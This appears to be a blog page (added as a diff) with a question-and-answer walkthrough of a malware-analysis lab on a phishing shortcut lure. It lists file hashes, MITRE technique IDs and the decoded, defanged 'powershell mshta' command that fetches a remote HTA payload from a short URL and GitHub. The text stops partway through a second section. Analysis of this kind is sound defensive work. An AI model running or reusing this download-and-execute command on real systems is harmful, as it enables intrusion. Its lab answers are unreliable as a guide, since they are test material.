@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Operation Silent Serpent MalOps | Zykrav - Blog</title><meta name="author" content="Davi Santana"><meta name="copyright" content="Davi Santana"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="A senior researcher at South Korea’s Ministry of Science opened a mali…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Operation Silent Serpent MalOps">
+<meta property="og:url" content="https://davigstana.github.io/SilentSerpent/index.html">
+<meta property="og:site_name" content="Zykrav - Blog">
+<meta property="og:description" content="A senior researcher at South Korea’s Ministry of Science opened a mali…">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://davigstana.github.io/SilentSerpent/cover.gif">
+<meta property="article:published_time" content="2026-08-20T21:50:03.467Z">
+<meta property="article:modified_time" content="2026-08-20T21:50:03.467Z">
+<meta property="article:author" content="Davi Santana">
+<meta property="article:tag" content="Trojan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://davigstana.github.io/SilentSerpent/cover.gif"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Operation Silent Serpent MalOps",
+  "url": "https://davigstana.github.io/SilentSerpent/",
+  "image": "https://davigstana.github.io/SilentSerpent/cover.gif",
+  "datePublished": "2026-08-20T21:50:03.467Z",
+  "dateModified": "2026-08-20T21:50:03.467Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Davi Santana",
+      "url": "https://davigstana.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://davigstana.github.io/SilentSerpent/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><meta name="google-site-verification" content="nhQl74qB5kTasevDkFUKXJdPMWL-84-KgUzefAFlybM"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7808274774731635" crossorigin="anonymous"></script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-921QF8PHT5"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-921QF8PHT5')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-921QF8PHT5', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Operation Silent Serpent MalOps',
+  isHighlightShrink: undefined,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Zykrav - Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Operation Silent Serpent MalOps</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Operation Silent Serpent MalOps</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2026-08-20T21:50:03.467Z" title="Created 2026-08-20 21:50:03">2026-08-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Malware-Analysis/">Malware Analysis</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>2mins</span></span></div></div></div><article class="container post-content" id="article-container"><h2 id="1-1-The-Lure"><a href="#1-1-The-Lure" class="headerlink" title="1.1 The Lure"></a>1.1 The Lure</h2><p>Scenario: An employee reported a strange email attachment. Your task is to analyze the extracted files and uncover the initial attack vector.</p>
+<p><img src="/SilentSerpent/LzMFmFX.png" alt="alt text"></p>
+<h3 id="1-1-1-Question-1"><a href="#1-1-1-Question-1" class="headerlink" title="1.1.1 Question 1"></a>1.1.1 Question 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the SHA256 hash of the decoy file?</span><br></pre></td></tr></table></figure>
+
+<p>R: 1D01EAB612DA7D635E6B92395EAD126E3E07B7987B3A38C8831E25CBCD5456B7</p>
+<p><img src="/SilentSerpent/ZkAV5W4.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-2-Question-2"><a href="#1-1-2-Question-2" class="headerlink" title="1.1.2 Question 2"></a>1.1.2 Question 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the SHA-256 hash of the suspected malicious file?</span><br></pre></td></tr></table></figure>
+
+<p>R: E51C6DAF902638023E5922A871279E57D858761EF500C3BCB214737CD39FCBDD</p>
+<p><img src="/SilentSerpent/ntXsEJD.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-3-Question-3"><a href="#1-1-3-Question-3" class="headerlink" title="1.1.3 Question 3"></a>1.1.3 Question 3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Which legitimate file type is the malicious file attempting to impersonate?</span><br></pre></td></tr></table></figure>
+
+<p>R: .txt</p>
+<hr>
+<h3 id="1-1-4-Question-4"><a href="#1-1-4-Question-4" class="headerlink" title="1.1.4 Question 4"></a>1.1.4 Question 4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">When was this malicious shortcut file created?</span><br></pre></td></tr></table></figure>
+
+<p>R: 2025-03-11 19:03:42</p>
+<p><img src="/SilentSerpent/gyVKDrE.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-5-Question-5"><a href="#1-1-5-Question-5" class="headerlink" title="1.1.5 Question 5"></a>1.1.5 Question 5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Which system executable is explicitly targeted to run by this malicious file?</span><br></pre></td></tr></table></figure>
+
+<p>R: powershell.exe</p>
+<p><img src="/SilentSerpent/qaFttte.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-6-Question-6"><a href="#1-1-6-Question-6" class="headerlink" title="1.1.6 Question 6"></a>1.1.6 Question 6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">To visually deceive the user, the malicious file uses a specific Icon Index. What is the index number?</span><br></pre></td></tr></table></figure>
+
+<p>R: 97</p>
+<p><img src="/SilentSerpent/Hh9L6ak.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-7-Question-7"><a href="#1-1-7-Question-7" class="headerlink" title="1.1.7 Question 7"></a>1.1.7 Question 7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What specific &#x27;Show window&#x27; flag is set to ensure the payload executes silently without alerting the user?</span><br></pre></td></tr></table></figure>
+
+<p>R: SW_SHOWMINNOACTIVE</p>
+<p><img src="/SilentSerpent/ttEssMn.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-8-Question-8"><a href="#1-1-8-Question-8" class="headerlink" title="1.1.8 Question 8"></a>1.1.8 Question 8</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">After decoding the payload, what is the full command executed by the malicious file?</span><br></pre></td></tr></table></figure>
+
+<p>R: powershell mshta “https[:]&#x2F;&#x2F;link24[.]kr&#x2F;A46bl74”</p>
+<p><img src="/SilentSerpent/Xq35BMh.png" alt="alt text"></p>
+<hr>
+<h3 id="1-1-9-Question-9"><a href="#1-1-9-Question-9" class="headerlink" title="1.1.9 Question 9"></a>1.1.9 Question 9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Which adversary technique is being used when the malicious file leverages a trusted Windows system executable to execute its payload?</span><br></pre></td></tr></table></figure>
+
+<p>R: System Binary Proxy Execution</p>
+<hr>
+<h3 id="1-1-10-Question-10"><a href="#1-1-10-Question-10" class="headerlink" title="1.1.10 Question 10"></a>1.1.10 Question 10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The decoded payload utilizes a specific utility to proxy execution. What is the MITRE ATT&amp;CK Sub-technique ID associated with the abuse of this specific binary?</span><br></pre></td></tr></table></figure>
+
+<p>R: T1218.005</p>
+<hr>
+<h3 id="1-1-11-Question-11"><a href="#1-1-11-Question-11" class="headerlink" title="1.1.11 Question 11"></a>1.1.11 Question 11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The initial payload makes a network request to a shortened URL. What is the full URL provided in the HTTP redirect response?</span><br></pre></td></tr></table></figure>
+
+<p>R: https[:]&#x2F;&#x2F;github[.]com&#x2F;deepsearch-tech&#x2F;ref&#x2F;releases&#x2F;download&#x2F;v1.0.0&#x2F;pwko[.]hta?v&#x3D;1 </p>
+<hr>
+<h3 id="1-1-12-Question-12"><a href="#1-1-12-Question-12" class="headerlink" title="1.1.12 Question 12"></a>1.1.12 Question 12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The redirect points to a specific file hosted on a public code repository. What is the name and extension of this downloaded file?</span><br></pre></td></tr></table></figure>
+
+<p>R: pwko.hta</p>
+<hr>
+<h3 id="1-1-13-Question-13"><a href="#1-1-13-Question-13" class="headerlink" title="1.1.13 Question 13"></a>1.1.13 Question 13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The redirected URL points to a file hosted on a public repository. What is the username or organization name associated with this repository?</span><br></pre></td></tr></table></figure>
+
+<p>R: deepsearch-tech</p>
+<hr>
+<h2 id="2-1-Remote-Staging"><a href="#2-1-Remote-Staging" class="headerlink" title="2.1 Remote Staging"></a>2.1 Remote Staging</h2><p>Scenario: The attacker leverages cloud infrastructure to deliver additional payloads. Analyze the retrieved scripts and map the delivery mechanism</p>
+<h3 id="2-1-1-Question-1"><a href="#2-1-1-Question-1" class="headerlink" title="2.1.1 Question 1"></a>2.1.1 Question 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the SHA256 hash of the file downloaded from the public repository?</span><br></pre></td></tr></table></figure>
+
+<p>R: 587bdf94bdaebcee4b51202beb507125a7fa37d705fb38cc076a9c1814578411</p>
+<p>pwko.hta file that was downloaded from the repository.</p>
+<hr>
+<h3 id="2-1-2-Question-2"><a href="#2-1-2-Question-2" class="headerlink" title="2.1.2 Question 2"></a>2.1.2 Question 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the exact file size in bytes of this downloaded payload?</span><br></pre></td></tr></table></figure>
+
+<p>R: 58290</p>
+<hr>
+<h3 id="2-1-3-Question-3"><a href="#2-1-3-Question-3" class="headerlink" title="2.1.3 Question 3"></a>2.1.3 Question 3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the primary scripting object utilized by the HTA file to execute system commands?</span><br></pre></td></tr></table></figure>
+
+<p>R: WSCRIPT.SHELL</p>
+<hr>
+<h3 id="2-1-4-Question-4"><a href="#2-1-4-Question-4" class="headerlink" title="2.1.4 Question 4"></a>2.1.4 Question 4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Which environment variable does the script use to set the working directory at the start?</span><br></pre></td></tr></table></figure>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Trojan/">Trojan</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/SyncBreeze/" title="Sync Breeze Enterprise 10.0.28 application"><img class="cover" src="/SyncBreeze/cover.gif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Sync Breeze Enterprise 10.0.28 application</div></div><div class="info-2"><div class="info-item-1">In the case of Sync Breeze Enterprise 10.0.28, the vulnerability is present in the web authentication interface, where user-provided data is not properly validated before being processed.</div></div></div></a><a class="pagination-related" href="/SilentLynx/" title="Multi-Stage Infection Chain Delivered via Phishing"><img class="cover" src="/SilentLynx/cover.gif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Multi-Stage Infection Chain Delivered via Phishing</div></div><div class="info-2"><div class="info-item-1">The analyzed samples show characteristics consistent with targeted campaigns, in which social engineering techniques are used as the initial vector of compromise.</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info-name">Davi Santana</div><div class="author-info-description">Malware | Reverse Engineering | Exploit Development</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://linkedin.com/in/davigsantana"><i class="fab fa-linkedin"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DaviGSantana" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.linkedin.com/in/davigsantana" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Research, analyses and documentation of malware, exploits and cyber operations.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-The-Lure"><span class="toc-text">1.1 The Lure</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-Question-1"><span class="toc-text">1.1.1 Question 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-Question-2"><span class="toc-text">1.1.2 Question 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-Question-3"><span class="toc-text">1.1.3 Question 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-4-Question-4"><span class="toc-text">1.1.4 Question 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-5-Question-5"><span class="toc-text">1.1.5 Question 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-6-Question-6"><span class="toc-text">1.1.6 Question 6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-7-Question-7"><span class="toc-text">1.1.7 Question 7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-8-Question-8"><span class="toc-text">1.1.8 Question 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-9-Question-9"><span class="toc-text">1.1.9 Question 9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-10-Question-10"><span class="toc-text">1.1.10 Question 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-11-Question-11"><span class="toc-text">1.1.11 Question 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-12-Question-12"><span class="toc-text">1.1.12 Question 12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-13-Question-13"><span class="toc-text">1.1.13 Question 13</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-Remote-Staging"><span class="toc-text">2.1 Remote Staging</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-Question-1"><span class="toc-text">2.1.1 Question 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-Question-2"><span class="toc-text">2.1.2 Question 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-Question-3"><span class="toc-text">2.1.3 Question 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-Question-4"><span class="toc-text">2.1.4 Question 4</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pma-chapter7/" title="Practical Malware Analysis - Malware Persistence Through Mutexes and Services"><img src="/pma-chapter7/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Practical Malware Analysis - Malware Persistence Through Mutexes and Services"/></a><div class="content"><a class="title" href="/pma-chapter7/" title="Practical Malware Analysis - Malware Persistence Through Mutexes and Services">Practical Malware Analysis - Malware Persistence Through Mutexes and Services</a><time datetime="2026-08-20T21:50:03.573Z" title="Created 2026-08-20 21:50:03">2026-08-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pma-chapter6/" title="Practical Malware Analysis - Recognizing C code constructions in Assembly"><img src="/pma-chapter6/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Practical Malware Analysis - Recognizing C code constructions in Assembly"/></a><div class="content"><a class="title" href="/pma-chapter6/" title="Practical Malware Analysis - Recognizing C code constructions in Assembly">Practical Malware Analysis - Recognizing C code constructions in Assembly</a><time datetime="2026-08-20T21:50:03.571Z" title="Created 2026-08-20 21:50:03">2026-08-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pma-chapter5/" title="Practical Malware Analysis - Identifying Malicious Behavior via Static Analysis"><img src="/pma-chapter5/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Practical Malware Analysis - Identifying Malicious Behavior via Static Analysis"/></a><div class="content"><a class="title" href="/pma-chapter5/" title="Practical Malware Analysis - Identifying Malicious Behavior via Static Analysis">Practical Malware Analysis - Identifying Malicious Behavior via Static Analysis</a><time datetime="2026-08-20T21:50:03.565Z" title="Created 2026-08-20 21:50:03">2026-08-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pma-chapter3/" title="Practical Malware Analysis - Basic Dynamic Analysis"><img src="/pma-chapter3/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Practical Malware Analysis - Basic Dynamic Analysis"/></a><div class="content"><a class="title" href="/pma-chapter3/" title="Practical Malware Analysis - Basic Dynamic Analysis">Practical Malware Analysis - Basic Dynamic Analysis</a><time datetime="2026-08-20T21:50:03.564Z" title="Created 2026-08-20 21:50:03">2026-08-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pma-chapter1/" title="Practical Malware Analysis - Basic Static Techniques"><img src="/pma-chapter1/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Practical Malware Analysis - Basic Static Techniques"/></a><div class="content"><a class="title" href="/pma-chapter1/" title="Practical Malware Analysis - Basic Static Techniques">Practical Malware Analysis - Basic Static Techniques</a><time datetime="2026-08-20T21:50:03.561Z" title="Created 2026-08-20 21:50:03">2026-08-20</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Davi Santana</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
